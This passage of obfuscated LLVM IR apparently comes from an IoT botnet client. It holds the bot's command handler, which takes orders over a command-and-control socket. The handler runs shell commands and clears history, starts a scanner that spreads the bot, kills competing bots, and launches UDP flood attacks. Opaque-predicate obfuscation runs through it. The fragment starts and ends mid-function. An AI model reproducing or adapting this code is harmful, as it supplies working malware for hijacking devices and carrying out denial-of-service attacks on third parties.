  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %79

; <label>:79:                                     ; preds = %originalBBpart2, %53
  %80 = load i8**, i8*** %4, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 1
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @strcmp(i8* %82, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %89, label %85

; <label>:85:                                     ; preds = %79
  %86 = call i32 @system(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.436, i32 0, i32 0))
  call void @ClearHistory()
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = call i32 (i32, i8*, ...) @sockprintf(i32 %87, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.437, i32 0, i32 0))
  br label %89

; <label>:89:                                     ; preds = %85, %79
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 1
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %99, label %95

; <label>:95:                                     ; preds = %89
  %96 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.439, i32 0, i32 0))
  call void @ClearHistory()
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i32 (i32, i8*, ...) @sockprintf(i32 %97, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.440, i32 0, i32 0))
  br label %99

; <label>:99:                                     ; preds = %95, %89
  %100 = load i8**, i8*** %4, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 1
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @strcmp(i8* %102, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.441, i32 0, i32 0)) #10
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %109, label %105

; <label>:105:                                    ; preds = %99
  %106 = call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.442, i32 0, i32 0))
  call void @ClearHistory()
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.443, i32 0, i32 0))
  br label %109

; <label>:109:                                    ; preds = %105, %99
  br label %110

; <label>:110:                                    ; preds = %109, %2
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 0
  %113 = load i8*, i8** %112, align 8
  %114 = call i32 @strcmp(i8* %113, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %115 = icmp ne i32 %114, 0
  br i1 %115, label %119, label %116

; <label>:116:                                    ; preds = %110
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.444, i32 0, i32 0))
  br label %1784

; <label>:119:                                    ; preds = %110
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 0
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @strcmp(i8* %122, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.445, i32 0, i32 0)) #10
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %145, label %125

; <label>:125:                                    ; preds = %119
  %126 = load i32, i32* @x.119
  %127 = load i32, i32* @y.120
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %125
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = call i32 @getdtablesize() #2
  %136 = call i32 (i32, i8*, ...) @sockprintf(i32 %134, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %135)
  %137 = load i32, i32* @x.119
  %138 = load i32, i32* @y.120
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %1784

; <label>:145:                                    ; preds = %119
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 0
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @strcmp(i8* %148, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %150 = icmp ne i32 %149, 0
  br i1 %150, label %154, label %151

; <label>:151:                                    ; preds = %145
  %152 = load i32, i32* @mainCommSock, align 4
  %153 = call i32 (i32, i8*, ...) @sockprintf(i32 %152, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.446, i32 0, i32 0))
  call void (i32, ...) bitcast (void ()* @binsBins to void (i32, ...)*)(i32 1)
  br label %1784

; <label>:154:                                    ; preds = %145
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 0
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @strcmp(i8* %157, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.447, i32 0, i32 0)) #10
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %264, label %160

; <label>:160:                                    ; preds = %154
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 1
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %175, label %166

; <label>:166:                                    ; preds = %160
  %167 = load i32, i32* @scanPid, align 4
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %166
  br label %1784

; <label>:170:                                    ; preds = %166
  %171 = load i32, i32* @scanPid, align 4
  %172 = call i32 @kill(i32 %171, i32 9) #2
  %173 = load i32, i32* @mainCommSock, align 4
  %174 = call i32 (i32, i8*, ...) @sockprintf(i32 %173, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.448, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  br label %175

; <label>:175:                                    ; preds = %170, %160
  %176 = load i32, i32* @x.119
  %177 = load i32, i32* @y.120
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %175
  %184 = load i8**, i8*** %4, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 1
  %186 = load i8*, i8** %185, align 8
  %187 = call i32 @strcmp(i8* %186, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i32 0, i32 0)) #10
  %188 = icmp ne i32 %187, 0
  %189 = load i32, i32* @x.119
  %190 = load i32, i32* @y.120
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %188, label %263, label %197

; <label>:197:                                    ; preds = %originalBBpart28
  %198 = load i32, i32* @scanPid, align 4
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %197
  br label %1784

; <label>:201:                                    ; preds = %197
  %202 = call i32 @fork() #2
  store i32 %202, i32* %5, align 4
  store i32 8192, i32* %7, align 4
  %203 = call i64 @sysconf(i32 84) #2
  %204 = mul nsw i64 %203, 64
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %8, align 4
  store i32 10, i32* %9, align 4
  %206 = load i32, i32* %5, align 4
  %207 = icmp sgt i32 %206, 0
  br i1 %207, label %208, label %226

; <label>:208:                                    ; preds = %201
  %209 = load i32, i32* @x.119
  %210 = load i32, i32* @y.120
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %208
  %217 = load i32, i32* %5, align 4
  store i32 %217, i32* @scanPid, align 4
  %218 = load i32, i32* @x.119
  %219 = load i32, i32* @y.120
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %1784

; <label>:226:                                    ; preds = %201
  %227 = load i32, i32* %5, align 4
  %228 = icmp eq i32 %227, -1
  br i1 %228, label %229, label %230

; <label>:229:                                    ; preds = %226
  br label %1784

; <label>:230:                                    ; preds = %226
  %231 = load i32, i32* @x.119
  %232 = load i32, i32* @y.120
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %230
  %239 = load i32, i32* @x.119
  %240 = load i32, i32* @y.120
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %247

; <label>:247:                                    ; preds = %originalBBpart216
  %248 = load i32, i32* @mainCommSock, align 4
  %249 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %250 = call i8* @inet_ntoa(i32 %249) #2
  %251 = call i32 (i32, i8*, ...) @sockprintf(i32 %248, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.450, i32 0, i32 0), i8* %250)
  store i32 0, i32* %6, align 4
  br label %252

; <label>:252:                                    ; preds = %259, %247
  %253 = load i32, i32* %6, align 4
  %254 = load i32, i32* %8, align 4
  %255 = icmp slt i32 %253, %254
  br i1 %255, label %256, label %262

; <label>:256:                                    ; preds = %252
  %257 = load i32, i32* %9, align 4
  %258 = load i32, i32* %7, align 4
  call void @StartTheLelz(i32 %257, i32 %258)
  br label %259

; <label>:259:                                    ; preds = %256
  %260 = load i32, i32* %6, align 4
  %261 = add nsw i32 %260, 1
  store i32 %261, i32* %6, align 4
  br label %252

; <label>:262:                                    ; preds = %252
  call void @_exit(i32 0) #12
  unreachable

; <label>:263:                                    ; preds = %originalBBpart28
  br label %264

; <label>:264:                                    ; preds = %263, %154
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 0
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @strcmp(i8* %267, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0)) #10
  %269 = icmp ne i32 %268, 0
  br i1 %269, label %295, label %270

; <label>:270:                                    ; preds = %264
  %271 = load i32, i32* @x.119
  %272 = load i32, i32* @y.120
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %270
  %279 = call i32 @listFork()
  %280 = icmp ne i32 %279, 0
  %281 = load i32, i32* @x.119
  %282 = load i32, i32* @y.120
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %280, label %294, label %289

; <label>:289:                                    ; preds = %originalBBpart220
  %290 = load i32, i32* @mainCommSock, align 4
  %291 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %292 = call i8* @inet_ntoa(i32 %291) #2
  %293 = call i32 (i32, i8*, ...) @sockprintf(i32 %290, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.452, i32 0, i32 0), i8* %292)
  call void @botkiller()
  call void @_exit(i32 0) #12
  unreachable

; <label>:294:                                    ; preds = %originalBBpart220
  br label %295

; <label>:295:                                    ; preds = %294, %264
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 0
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.453, i32 0, i32 0)) #10
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %306, label %301

; <label>:301:                                    ; preds = %295
  %302 = load i32, i32* @mainCommSock, align 4
  %303 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %304 = call i8* @inet_ntoa(i32 %303) #2
  %305 = call i32 (i32, i8*, ...) @sockprintf(i32 %302, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.454, i32 0, i32 0), i8* %304)
  br label %1784

; <label>:306:                                    ; preds = %295
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 0
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @strcmp(i8* %309, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.455, i32 0, i32 0)) #10
  %311 = icmp ne i32 %310, 0
  br i1 %311, label %617, label %312

; <label>:312:                                    ; preds = %306
  %313 = load i32, i32* %3, align 4
  %314 = icmp slt i32 %313, 6
  br i1 %314, label %398, label %315

; <label>:315:                                    ; preds = %312
  %316 = load i8**, i8*** %4, align 8
  %317 = getelementptr inbounds i8*, i8** %316, i64 3
  %318 = load i8*, i8** %317, align 8
  %319 = call i32 @atoi(i8* %318) #10
  %320 = icmp eq i32 %319, -1
  br i1 %320, label %398, label %321

; <label>:321:                                    ; preds = %315
  %322 = load i32, i32* @x.119
  %323 = load i32, i32* @y.120
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %321
  %330 = load i8**, i8*** %4, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 2
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #10
  %334 = icmp eq i32 %333, -1
  %335 = load i32, i32* @x.119
  %336 = load i32, i32* @y.120
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %334, label %398, label %343

; <label>:343:                                    ; preds = %originalBBpart224
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 4
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* %346) #10
  %348 = icmp eq i32 %347, -1
  br i1 %348, label %398, label %349

; <label>:349:                                    ; preds = %343
  %350 = load i8**, i8*** %4, align 8
  %351 = getelementptr inbounds i8*, i8** %350, i64 5
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @atoi(i8* %352) #10
  %354 = icmp eq i32 %353, -1
  br i1 %354, label %398, label %355

; <label>:355:                                    ; preds = %349
  %356 = load i32, i32* @x.119
  %357 = load i32, i32* @y.120
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %355
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 5
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #10
  %368 = icmp sgt i32 %367, 65536
  %369 = load i32, i32* @x.119
  %370 = load i32, i32* @y.120
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %368, label %398, label %377

; <label>:377:                                    ; preds = %originalBBpart228
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 5
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @atoi(i8* %380) #10
  %382 = icmp sgt i32 %381, 65500
  br i1 %382, label %398, label %383

; <label>:383:                                    ; preds = %377
  %384 = load i8**, i8*** %4, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 4
  %386 = load i8*, i8** %385, align 8
  %387 = call i32 @atoi(i8* %386) #10
  %388 = icmp sgt i32 %387, 32
  br i1 %388, label %398, label %389

; <label>:389:                                    ; preds = %383
  %390 = load i32, i32* %3, align 4
  %391 = icmp eq i32 %390, 7
  br i1 %391, label %392, label %417

; <label>:392:                                    ; preds = %389
  %393 = load i8**, i8*** %4, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 6
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #10
  %397 = icmp slt i32 %396, 1
  br i1 %397, label %398, label %417

; <label>:398:                                    ; preds = %392, %383, %377, %originalBBpart228, %349, %343, %originalBBpart224, %315, %312
  %399 = load i32, i32* @x.119
  %400 = load i32, i32* @y.120
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %398
  %407 = load i32, i32* @mainCommSock, align 4
  %408 = call i32 (i32, i8*, ...) @sockprintf(i32 %407, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i32 0, i32 0))
  %409 = load i32, i32* @x.119
  %410 = load i32, i32* @y.120
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %1784

; <label>:417:                                    ; preds = %392, %389
  %418 = load i32, i32* @x.119
  %419 = load i32, i32* @y.120
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %417
  %426 = load i8**, i8*** %4, align 8
  %427 = getelementptr inbounds i8*, i8** %426, i64 1
  %428 = load i8*, i8** %427, align 8
  store i8* %428, i8** %10, align 8
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 2
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #10
  store i32 %432, i32* %11, align 4
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds i8*, i8** %433, i64 3
  %435 = load i8*, i8** %434, align 8
  %436 = call i32 @atoi(i8* %435) #10
  store i32 %436, i32* %12, align 4
  %437 = load i8**, i8*** %4, align 8
  %438 = getelementptr inbounds i8*, i8** %437, i64 4
  %439 = load i8*, i8** %438, align 8
  %440 = call i32 @atoi(i8* %439) #10
  store i32 %440, i32* %13, align 4
  %441 = load i8**, i8*** %4, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 5
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @atoi(i8* %443) #10
  store i32 %444, i32* %14, align 4
  %445 = load i32, i32* %3, align 4
  %446 = icmp sgt i32 %445, 6
  %447 = load i32, i32* @x.119
  %448 = load i32, i32* @y.120
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %446, label %455, label %460

; <label>:455:                                    ; preds = %originalBBpart236
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 6
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @atoi(i8* %458) #10
  br label %477

; <label>:460:                                    ; preds = %originalBBpart236
  %461 = load i32, i32* @x.119
  %462 = load i32, i32* @y.120
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %460
  %469 = load i32, i32* @x.119
  %470 = load i32, i32* @y.120
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %477

; <label>:477:                                    ; preds = %originalBBpart240, %455
  %478 = phi i32 [ %459, %455 ], [ 1000, %originalBBpart240 ]
  store i32 %478, i32* %15, align 4
  %479 = load i32, i32* %3, align 4
  %480 = icmp sgt i32 %479, 7
  br i1 %480, label %481, label %486

; <label>:481:                                    ; preds = %477
  %482 = load i8**, i8*** %4, align 8
  %483 = getelementptr inbounds i8*, i8** %482, i64 7
  %484 = load i8*, i8** %483, align 8
  %485 = call i32 @atoi(i8* %484) #10
  br label %487

; <label>:486:                                    ; preds = %477
  br label %487

; <label>:487:                                    ; preds = %486, %481
  %488 = phi i32 [ %485, %481 ], [ 1000000, %486 ]
  store i32 %488, i32* %16, align 4
  %489 = load i32, i32* %3, align 4
  %490 = icmp sgt i32 %489, 8
  br i1 %490, label %491, label %496

; <label>:491:                                    ; preds = %487
  %492 = load i8**, i8*** %4, align 8
  %493 = getelementptr inbounds i8*, i8** %492, i64 8
  %494 = load i8*, i8** %493, align 8
  %495 = call i32 @atoi(i8* %494) #10
  br label %513

; <label>:496:                                    ; preds = %487
  %497 = load i32, i32* @x.119
  %498 = load i32, i32* @y.120
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %496
  %505 = load i32, i32* @x.119
  %506 = load i32, i32* @y.120
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %513

; <label>:513:                                    ; preds = %originalBBpart244, %491
  %514 = phi i32 [ %495, %491 ], [ 0, %originalBBpart244 ]
  %515 = load i32, i32* @x.119
  %516 = load i32, i32* @y.120
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %513
  store i32 %514, i32* %17, align 4
  %523 = load i8*, i8** %10, align 8
  %524 = call i8* @strstr(i8* %523, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %525 = icmp ne i8* %524, null
  %526 = load i32, i32* @x.119
  %527 = load i32, i32* @y.120
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %525, label %534, label %603

; <label>:534:                                    ; preds = %originalBBpart248
  %535 = load i8*, i8** %10, align 8
  %536 = call i8* @strtok(i8* %535, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %536, i8** %18, align 8
  br label %537

; <label>:537:                                    ; preds = %originalBBpart260, %534
  %538 = load i32, i32* @x.119
  %539 = load i32, i32* @y.120
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %537
  %546 = load i8*, i8** %18, align 8
  %547 = icmp ne i8* %546, null
  %548 = load i32, i32* @x.119
  %549 = load i32, i32* @y.120
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %547, label %556, label %602

; <label>:556:                                    ; preds = %originalBBpart252
  %557 = call i32 @listFork()
  %558 = icmp ne i32 %557, 0
  br i1 %558, label %584, label %559

; <label>:559:                                    ; preds = %556
  %560 = load i32, i32* @x.119
  %561 = load i32, i32* @y.120
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %559
  %568 = load i8*, i8** %18, align 8
  %569 = load i32, i32* %11, align 4
  %570 = load i32, i32* %12, align 4
  %571 = load i32, i32* %13, align 4
  %572 = load i32, i32* %14, align 4
  %573 = load i32, i32* %15, align 4
  %574 = load i32, i32* %16, align 4
  %575 = load i32, i32* %17, align 4
  call void @sendUDP(i8* %568, i32 %569, i32 %570, i32 %571, i32 %572, i32 %573, i32 %574, i32 %575)
  call void @_exit(i32 0) #12
  %576 = load i32, i32* @x.119
  %577 = load i32, i32* @y.120
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  unreachable

; <label>:584:                                    ; preds = %556
  %585 = load i32, i32* @x.119
  %586 = load i32, i32* @y.120
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %584
  %593 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %593, i8** %18, align 8
  %594 = load i32, i32* @x.119
  %595 = load i32, i32* @y.120
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %537

; <label>:602:                                    ; preds = %originalBBpart252
  br label %616

; <label>:603:                                    ; preds = %originalBBpart248
  %604 = call i32 @listFork()
  %605 = icmp ne i32 %604, 0
  br i1 %605, label %615, label %606

; <label>:606:                                    ; preds = %603
  %607 = load i8*, i8** %10, align 8
  %608 = load i32, i32* %11, align 4
  %609 = load i32, i32* %12, align 4
